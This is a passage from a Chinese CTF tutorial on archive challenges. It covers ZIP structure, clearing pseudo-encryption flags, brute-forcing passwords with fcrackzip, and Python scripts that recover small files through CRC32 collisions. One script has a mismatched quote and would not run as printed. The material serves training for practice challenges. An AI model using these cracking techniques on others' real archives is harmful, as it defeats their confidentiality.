CRC数据校验算法等等知识点。</p>\n</blockquote>\n<span id=\"more\"></span>\n\n<h1 id=\"常见压缩包格式和文件结构\"><a href=\"#常见压缩包格式和文件结构\" class=\"headerlink\" title=\"常见压缩包格式和文件结构\"></a>常见压缩包格式和文件结构</h1><p>虽说平时大家看文件类型都是靠文件后缀，但是这里是CTF，什么情况都有可能出来，所以拿到题目附件之后，应当先准确判断文件类型，确认是压缩包类后再考虑接下来的做法。</p>\n<h2 id=\"ZIP文件\"><a href=\"#ZIP文件\" class=\"headerlink\" title=\"ZIP文件\"></a>ZIP文件</h2><p>ZIP文件格式是一种数据压缩和文档储存的文件格式，原名Deflate，发明者为菲尔·卡茨（Phil Katz），他于1989年1月公布了该格式的资料。ZIP通常使用后缀名“.zip”，它的<code>MIME</code>格式为<code>application/zip</code>。</p>\n<h3 id=\"zip文件结构\"><a href=\"#zip文件结构\" class=\"headerlink\" title=\"zip文件结构\"></a>zip文件结构</h3><p>一个 ZIP 文件由三个部分组成：<code>压缩源文件数据区</code>+<code>压缩源文件目录区</code>+<code>压缩源文件目录结束标志</code></p>\n<p>这里拿一个小的测试用zip文件举例：</p>\n<h4 id=\"zip文件源数据区\"><a href=\"#zip文件源数据区\" class=\"headerlink\" title=\"zip文件源数据区\"></a>zip文件源数据区</h4><p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210918210114460.png\" alt=\"image-20210918210114460\"></p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210919105714632.png\" alt=\"image-20210919105714632\"></p>\n<blockquote>\n<p>struct ZIPFILERECORD record</p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th>HEX数据</th>\n<th>描述</th>\n<th>010Editor模板数据</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>50 4B 03 04</td>\n<td>zip文件头标记，看文本的话就是PK开头</td>\n<td>char frSignature[4]</td>\n</tr>\n<tr>\n<td>0A 00</td>\n<td>解压文件所需 pkware 版本</td>\n<td>ushort frVersion</td>\n</tr>\n<tr>\n<td>00 00</td>\n<td>全局方式位标记（有无加密），头文件标记后2bytes</td>\n<td>ushort frFlags</td>\n</tr>\n<tr>\n<td>00 00</td>\n<td>压缩方式</td>\n<td>enum COMPTYPE frCompression</td>\n</tr>\n<tr>\n<td>E8 A6</td>\n<td>最后修改文件时间</td>\n<td>DOSTIME frFileTime</td>\n</tr>\n<tr>\n<td>32 53</td>\n<td>最后修改文件日期</td>\n<td>DOSDATE frFileDate</td>\n</tr>\n<tr>\n<td>0C 7E 7F D8</td>\n<td>CRC-32校验</td>\n<td>uint frCrc</td>\n</tr>\n</tbody></table>\n<h4 id=\"zip文件源数据目录区\"><a href=\"#zip文件源数据目录区\" class=\"headerlink\" title=\"zip文件源数据目录区\"></a>zip文件源数据目录区</h4><blockquote>\n<p>struct ZIPDIRENTRY dirEntry</p>\n</blockquote>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210918211236766.png\" alt=\"image-20210918211236766\"></p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210919105803076.png\" alt=\"image-20210919105803076\"></p>\n<table>\n<thead>\n<tr>\n<th>HEX数据</th>\n<th>描述</th>\n<th>010Editor模板数据</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>50 4B 01 02</td>\n<td>目录中文件文件头标记</td>\n<td>char deSignature[4]</td>\n</tr>\n<tr>\n<td>3F 00</td>\n<td>压缩使用的 pkware 版本</td>\n<td>ushort deVersionMadeBy</td>\n</tr>\n<tr>\n<td>0A 00</td>\n<td>解压文件所需 pkware 版本</td>\n<td>ushort deVersionToExtract</td>\n</tr>\n<tr>\n<td>00 00</td>\n<td>全局方式位标记（有无加密），目录文件标记后4bytes</td>\n<td>ushort frFlags</td>\n</tr>\n<tr>\n<td>00 00</td>\n<td>压缩方式</td>\n<td>enum COMPTYPE frCompression</td>\n</tr>\n<tr>\n<td>E8 A6</td>\n<td>最后修改文件时间</td>\n<td>DOSTIME frFileTime</td>\n</tr>\n<tr>\n<td>32 53</td>\n<td>最后修改文件日期</td>\n<td>DOSDATE frFileDate</td>\n</tr>\n<tr>\n<td>0C 7E 7F D8</td>\n<td>CRC-32校验</td>\n<td>uint frCrc</td>\n</tr>\n</tbody></table>\n<h4 id=\"zip文件源数据目录结束区\"><a href=\"#zip文件源数据目录结束区\" class=\"headerlink\" title=\"zip文件源数据目录结束区\"></a>zip文件源数据目录结束区</h4><blockquote>\n<p>struct ZIPENDLOCATOR endLocator<img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210918211925313.png\" alt=\"image-20210918211925313\"></p>\n</blockquote>\n<table>\n<thead>\n<tr>\n<th>HEX数据</th>\n<th>描述</th>\n<th>010Editor模板数据</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>50 4B 05 06</td>\n<td>目录结束标记</td>\n<td>char elSignature[4]</td>\n</tr>\n<tr>\n<td>00 00</td>\n<td>当前磁盘编号</td>\n<td>ushort elDiskNumber</td>\n</tr>\n<tr>\n<td>00 00</td>\n<td>目录区开始磁盘编号</td>\n<td>ushort elStartDiskNumber</td>\n</tr>\n</tbody></table>\n<blockquote>\n<p>对于多文件的压缩包，其结构不会如此简单，但按照格式依然可以对照得出：</p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210918213503251.png\" alt=\"image-20210918213503251\"></p>\n</blockquote>\n<h3 id=\"zip文件常见考点\"><a href=\"#zip文件常见考点\" class=\"headerlink\" title=\"zip文件常见考点\"></a>zip文件常见考点</h3><h4 id=\"zip伪加密\"><a href=\"#zip伪加密\" class=\"headerlink\" title=\"zip伪加密\"></a>zip伪加密</h4><p>zip文件的伪加密，正如他的名字，即虽然zip文件本身没有加密，但是通过修改zip文件中的标记数据，让解压软件认为文件存在加密，故达到了伪加密的效果。而标记zip文件是否加密的标记，则是上文中<code>zip文件源数据区</code>中的<code>ushort frFlags</code>（全局标记文件是否加密）和<code>zip文件源数据目录区</code>中的<code>ushort frFlags</code>（全局标记文件是否加密，伪加密的关键点）两个位置。</p>\n<p>在正常加密的情况下，<code>源数据区</code>的加密标记和<code>源文件目录区</code>的加密标志点应当是同一个数据，然而在一般的zip伪加密中，往往<code>zip文件源数据区</code>中的<code>ushort frFlags</code>数据点为0，偶数即标志着文件不存在加密，但是<code>zip文件源数据目录区</code>中的<code>ushort frFlags</code>数据点不为偶数，标志着文件存在加密。这样前后标志冲突，软件会认为zip文件存在加密，但是无论用什么密码都无法解压，因为文件数据根本没有加密。</p>\n<p>在这种情况下，可以选择使用16进制编辑工具（推荐<code>010 Editor</code>，用模板功能可以方便地定位标志数据的位置）来手动编辑文件数据，通过将<code>zip文件源数据目录区</code>中的<code>ushort frFlags</code>数据点中的数据全部改为0，即可让文件认为文件不存在加密方式，就可以顺利解出数据。</p>\n<h5 id=\"例题\"><a href=\"#例题\" class=\"headerlink\" title=\"例题\"></a>例题</h5><p><a href=\"https://buuoj.cn/challenges#zip%E4%BC%AA%E5%8A%A0%E5%AF%86\">BUUCTF-zip伪加密</a></p>\n<p>这道题的zip附件下载下来直接解压，会发现解压出的flag.txt文件为空白，并提示输入密码。用十六进制编辑器看一下zip文件的数据：</p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210918215518320.png\" alt=\"image-20210918215518320\"></p>\n<p>根据题目提示，尝试把所有加密标记点改为0：</p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210918215633656.png\" alt=\"image-20210918215633656\"></p>\n<p>再尝试解压，便可以成功解压。</p>\n<h5 id=\"自动脚本\"><a href=\"#自动脚本\" class=\"headerlink\" title=\"自动脚本\"></a>自动脚本</h5><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> struct</span><br><span class=\"line\">out_HEX = []</span><br><span class=\"line\">head = [<span class=\"string\">b&#x27;P&#x27;</span>, <span class=\"string\">b&#x27;K&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span>():</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;$ zip伪加密自动解密脚本 $&quot;</span>,end=<span class=\"string\">&quot;\\n\\n&quot;</span>)</span><br><span class=\"line\">    infile = <span class=\"built_in\">open</span>(<span class=\"string\">&quot;D:\\\\Downloads\\\\test.zip&quot;</span>, <span class=\"string\">&quot;rb&quot;</span>)</span><br><span class=\"line\">    i: <span class=\"built_in\">int</span> = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> i &lt;= <span class=\"number\">1</span>:</span><br><span class=\"line\">        c = infile.read(<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"comment\"># print(c)</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> c == head[i]:</span><br><span class=\"line\">            out_HEX.append(<span class=\"built_in\">ord</span>(c))</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;传入的非zip文件&quot;</span>)</span><br><span class=\"line\">            exit()</span><br><span class=\"line\">        i += <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        c = infile.read(<span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> c:</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        out_HEX.append(<span class=\"built_in\">ord</span>(c))</span><br><span class=\"line\">    infile.close()</span><br><span class=\"line\">    <span class=\"comment\"># print(out_HEX)</span></span><br><span class=\"line\"></span><br><span class=\"line\">    len_out = <span class=\"built_in\">len</span>(out_HEX)</span><br><span class=\"line\">    i: <span class=\"built_in\">int</span> = <span class=\"number\">0</span></span><br><span class=\"line\">    <span class=\"keyword\">while</span> i &lt; len_out:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> out_HEX[i] == <span class=\"number\">80</span> <span class=\"keyword\">and</span> out_HEX[i+<span class=\"number\">1</span>] == <span class=\"number\">75</span> <span class=\"keyword\">and</span> out_HEX[i+<span class=\"number\">2</span>] == <span class=\"number\">3</span> <span class=\"keyword\">and</span> out_HEX[i+<span class=\"number\">3</span>] == <span class=\"number\">4</span>: <span class=\"comment\"># zip文件源数据区</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;zip文件源数据区： &quot;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> out_HEX[i:i+<span class=\"number\">4</span>]:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(letter,end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;--&gt;&quot;</span>,end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> out_HEX[i:i+<span class=\"number\">4</span>]:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(letter),end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;zip文件源数据区加密状态： &quot;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(out_HEX[i+<span class=\"number\">6</span>])+<span class=\"string\">&quot; &quot;</span>+<span class=\"built_in\">str</span>(out_HEX[i+<span class=\"number\">7</span>]))</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">            out_HEX.pop(i+<span class=\"number\">6</span>)</span><br><span class=\"line\">            out_HEX.insert(i+<span class=\"number\">6</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">            out_HEX.pop(i+<span class=\"number\">7</span>)</span><br><span class=\"line\">            out_HEX.insert(i+<span class=\"number\">7</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> out_HEX[i] == <span class=\"number\">80</span> <span class=\"keyword\">and</span> out_HEX[i+<span class=\"number\">1</span>] == <span class=\"number\">75</span> <span class=\"keyword\">and</span> out_HEX[i+<span class=\"number\">2</span>] == <span class=\"number\">1</span> <span class=\"keyword\">and</span> out_HEX[i+<span class=\"number\">3</span>] == <span class=\"number\">2</span>: <span class=\"comment\"># zip文件源数据目录区</span></span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;zip文件源数据目录区 &quot;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> out_HEX[i:i+<span class=\"number\">4</span>]:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(letter,end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;--&gt;&quot;</span>,end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">            <span class=\"keyword\">for</span> letter <span class=\"keyword\">in</span> out_HEX[i:i+<span class=\"number\">4</span>]:</span><br><span class=\"line\">                <span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(letter),end=<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;zip文件源数据目录区加密状态： &quot;</span>,end=<span class=\"string\">&quot;&quot;</span>)</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"built_in\">str</span>(out_HEX[i+<span class=\"number\">6</span>])+<span class=\"string\">&quot; &quot;</span>+<span class=\"built_in\">str</span>(out_HEX[i+<span class=\"number\">7</span>]))</span><br><span class=\"line\">            <span class=\"built_in\">print</span>(<span class=\"string\">&quot;\\n&quot;</span>)</span><br><span class=\"line\">            out_HEX.pop(i+<span class=\"number\">8</span>)</span><br><span class=\"line\">            out_HEX.insert(i+<span class=\"number\">8</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">            out_HEX.pop(i+<span class=\"number\">9</span>)</span><br><span class=\"line\">            out_HEX.insert(i+<span class=\"number\">9</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">        i += <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;D:\\\\Downloads\\\\out.zip&quot;</span>, <span class=\"string\">&quot;wb&quot;</span>) <span class=\"keyword\">as</span> outfile:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> bytes_ <span class=\"keyword\">in</span> out_HEX:</span><br><span class=\"line\">            <span class=\"comment\"># print(bytes_)</span></span><br><span class=\"line\">            <span class=\"comment\"># print(struct.pack(&quot;B&quot;, bytes_))</span></span><br><span class=\"line\">            outfile.write(struct.pack(<span class=\"string\">&quot;B&quot;</span>, bytes_))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;文件已解密&quot;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">&#x27;__main__&#x27;</span>:</span><br><span class=\"line\">    main()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"爆破\"><a href=\"#爆破\" class=\"headerlink\" title=\"爆破\"></a>爆破</h4><p>直接爆破密码可能是最常见，也是最无脑的zip文件考点了，现在依靠<code>ARCHPR</code>和<code>fcrackzip</code>这类工具，已经完全不需要用户手动编写脚本，单单依靠工具便可以十分轻松地暴力破解脚本。</p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210919085438424.png\" alt=\"image-20210919085438424\"></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">randark@randark-VirtualBox:~$ fcrackzip --help</span><br><span class=\"line\"></span><br><span class=\"line\">fcrackzip version 1.0, a fast/free zip password cracker</span><br><span class=\"line\">written by Marc Lehmann &lt;pcg@goof.com&gt; You can find more info on</span><br><span class=\"line\">http://www.goof.com/pcg/marc/</span><br><span class=\"line\"></span><br><span class=\"line\">USAGE: fcrackzip</span><br><span class=\"line\">          [-b|--brute-force]            use brute force algorithm</span><br><span class=\"line\">          [-D|--dictionary]             use a dictionary</span><br><span class=\"line\">          [-B|--benchmark]              execute a small benchmark</span><br><span class=\"line\">          [-c|--charset characterset]   use characters from charset</span><br><span class=\"line\">          [-h|--help]                   show this message</span><br><span class=\"line\">          [--version]                   show the version of this program</span><br><span class=\"line\">          [-V|--validate]               sanity-check the algorithm</span><br><span class=\"line\">          [-v|--verbose]                be more verbose</span><br><span class=\"line\">          [-p|--init-password string]   use string as initial password/file</span><br><span class=\"line\">          [-l|--length min-max]         check password with length min to max</span><br><span class=\"line\">          [-u|--use-unzip]              use unzip to weed out wrong passwords</span><br><span class=\"line\">          [-m|--method num]             use method number &quot;num&quot; (see below)</span><br><span class=\"line\">          [-2|--modulo r/m]             only calculcate 1/m of the password</span><br><span class=\"line\">          file...                    the zipfiles to crack</span><br><span class=\"line\"></span><br><span class=\"line\">methods compiled in (* = default):</span><br><span class=\"line\"></span><br><span class=\"line\"> 0: cpmask</span><br><span class=\"line\"> 1: zip1</span><br><span class=\"line\">*2: zip2, USE_MULT_TAB</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n\n\n<h5 id=\"纯暴力\"><a href=\"#纯暴力\" class=\"headerlink\" title=\"纯暴力\"></a>纯暴力</h5><p>同字面意思，尝试所有可能选项来爆破压缩包密码，耗时随密码复杂度和密码长度而无限增长。一般纯暴力破解的题目，密码的长度一般不会超过6位纯数字。</p>\n<p>用<code>fcrackzip</code>破解6位纯数字加密：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">fcrackzip -v -b -u -c1 a -p aaaaaa test.zip </span><br></pre></td></tr></table></figure>\n\n<p><del><em>我个人还是感觉<code>ARCHPR</code>好用</em></del></p>\n<h5 id=\"掩码\"><a href=\"#掩码\" class=\"headerlink\" title=\"掩码\"></a>掩码</h5><p>原理其实和纯暴力大同小异，但是由于知道了部分密码，从而可以选择对密码的特定位置进行枚举爆破。</p>\n<p>例如，对于密码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">this_it_a_password</span><br></pre></td></tr></table></figure>\n\n<p>题目可能只会提示：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">this_??_a_pa?????d</span><br></pre></td></tr></table></figure>\n\n<p>那么问号中的字符就需要选手枚举破解。</p>\n<h5 id=\"自动脚本-1\"><a href=\"#自动脚本-1\" class=\"headerlink\" title=\"自动脚本\"></a>自动脚本</h5><p><del><em>有工具还要脚本干嘛</em></del></p>\n<h4 id=\"CRC32爆破\"><a href=\"#CRC32爆破\" class=\"headerlink\" title=\"CRC32爆破\"></a>CRC32爆破</h4><p><code>CRC</code> 本身是「冗余校验码」的意思，全称是循环冗余校验。<code>CRC32</code> 则表示会产生一个 <code>32 bit</code> ( <code>8</code> 位十六进制数) 的校验值。由于 <code>CRC32</code> 产生校验值时源数据块的每一个 <code>bit</code> (位) 都参与了计算，所以数据块中即使只有一位发生了变化，也会得到不同的 <code>CRC32</code> 值，利用这个原理我们可以直接爆破出加密文件的内容。由于CPU能力，CRC碰撞只能用于压缩文件较小的情况（≤7bytes）</p>\n<p>常见的题型大致可分为两种：一是只给出含有一个文件的压缩包；二是给出多个含有一个文件的压缩包，或给出一个含有多个文件的压缩包</p>\n<p>值得注意的是 ，<code>zip</code> 中的 <code>CRC32</code> 是未加密文件的校验值。也就意味着可以对小文件直接进行CRC32碰撞，从而得到文件的真实内容。这也就导致了基于 <code>CRC32爆破</code> 的攻击手法。<br>以下为<code>CRC32爆破</code>的特征</p>\n<ul>\n<li>文件内内容很少 (一般比赛中大多为 <code>4</code> 字节左右)</li>\n<li> 加密的密码很长，几乎不能直接暴力破解</li>\n</ul>\n<h5 id=\"例题-1\"><a href=\"#例题-1\" class=\"headerlink\" title=\"例题\"></a>例题</h5><p><a href=\"https://buuoj.cn/challenges#zip\">BUUCTF-zip</a></p>\n<p>附件下载解压，得到了一堆压缩包：</p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210919102026118.png\" alt=\"image-20210919102026118\"></p>\n<p>尝试纯暴力破解，发现不行，看一下文件大小，发现文件数据仅仅4b，可以断定是CRC32爆破：</p>\n<p><img src=\"/special/Misc-%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%B1%BB%E5%88%86%E6%9E%90.assets/image-20210919102134438.png\" alt=\"image-20210919102134438\"></p>\n<p>针对单个文件写个CRC32碰撞脚本：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CrackCrc</span>(<span class=\"params\">crc</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> dic: <span class=\"comment\"># 四个循环对应文件大小为4b</span></span><br><span class=\"line\">                    s = i + j + k + h</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class=\"line\">                        f.write(s)</span><br><span class=\"line\">                        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">dic = string.ascii_letters + string.digits + <span class=\"string\">&#x27;+/=&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;D:\\\\Downloads\\\\b2ca8799-13d7-45df-a707-94373bf2800c\\\\out.txt&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;CRC32begin&quot;</span>)</span><br><span class=\"line\">    file = <span class=\"string\">&quot;D:\\\\Downloads\\\\b2ca8799-13d7-45df-a707-94373bf2800c\\\\&quot;</span>+<span class=\"string\">&#x27;out1.zip&#x27;</span></span><br><span class=\"line\">    crc = zipfile.ZipFile(file, <span class=\"string\">&#x27;r&#x27;</span>).getinfo(<span class=\"string\">&#x27;data.txt&#x27;</span>).CRC</span><br><span class=\"line\">    CrackCrc(crc)</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;CRC32finished&quot;</span>)</span><br></pre></td></tr></table></figure>\n\n<p>再写一个大循环把所有文件批量处理，并且加上进度条：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CrackCrc</span>(<span class=\"params\">crc</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                    s = i + j + k + h</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class=\"line\">                        f.write(s)</span><br><span class=\"line\">                        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CrackZip</span>():</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">0</span>, <span class=\"number\">68</span>):</span><br><span class=\"line\">        file = <span class=\"string\">&quot;D:\\\\Downloads\\\\b2ca8799-13d7-45df-a707-94373bf2800c\\\\&quot;</span>+<span class=\"string\">&#x27;out&#x27;</span> + <span class=\"built_in\">str</span>(i) + <span class=\"string\">&#x27;.zip&#x27;</span></span><br><span class=\"line\">        crc = zipfile.ZipFile(file, <span class=\"string\">&#x27;r&#x27;</span>).getinfo(<span class=\"string\">&#x27;data.txt&#x27;</span>).CRC</span><br><span class=\"line\">        CrackCrc(crc)</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&#x27;\\r&#x27;</span> + <span class=\"string\">&quot;loading：&#123;:%&#125;&quot;</span>.<span class=\"built_in\">format</span>(<span class=\"built_in\">float</span>((i + <span class=\"number\">1</span>) / <span class=\"number\">68</span>)), end=<span class=\"string\">&#x27;&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">dic = string.ascii_letters + string.digits + <span class=\"string\">&#x27;+/=&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;D:\\\\Downloads\\\\b2ca8799-13d7-45df-a707-94373bf2800c\\\\out.txt&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;CRC32 begin&quot;</span>)</span><br><span class=\"line\">    CrackZip()</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;CRC32 finished&quot;</span>)</span><br><span class=\"line\">    f.close()</span><br></pre></td></tr></table></figure>\n\n<p>运行脚本，便可以得到zip文件解密后的数据。</p>\n<p>另外，也有现成的Github项目：<a href=\"https://github.com/kmyk/zip-crc-cracker\">https://github.com/kmyk/zip-crc-cracker</a></p>\n<h5 id=\"自动脚本-2\"><a href=\"#自动脚本-2\" class=\"headerlink\" title=\"自动脚本\"></a>自动脚本</h5><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">CrackCrc</span>(<span class=\"params\">crc</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> dic:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> h <span class=\"keyword\">in</span> dic: <span class=\"comment\"># 循环个数取决于CRC32破解的目标文件大小</span></span><br><span class=\"line\">                    s = i + j + k + h</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> crc == (binascii.crc32(s.encode())):</span><br><span class=\"line\">                        f.write(s)</span><br><span class=\"line\">                        <span class=\"keyword\">return</span></span><br><span class=\"line\"></span><br><span class=\"line\">dic = string.ascii_letters + string.digits + <span class=\"string\">&#x27;+/=&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&#x27;out.txt&#x27;</span>, <span class=\"string\">&#x27;w&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(<span class=\"string\">&quot;CRC32begin&quot;</span>)</span><br><span class=\"line\">    file = <span class=\"string\">&quot;res.zip&#x27;</span></span><br><span class=\"line\"><span class=\"string\">    crc = zipfile.ZipFile(file, &#x27;r&#x27;).getinfo(&#x27;data.txt&#x27;).CRC</span></span><br><span class=\"line\"><span class=\"string\">    CrackCrc(crc)</span></span><br><span class=\"line\"><span class=\"string\">    print(&quot;</span>CRC32finished<span class=\"string\">&quot;)</span></span><br></pre></td></tr></table></figure>\n\n<p>另外，还有针对多文件的CRC32碰撞脚本：</p>\n<figure class=\"highlight python\"><table><tr><td 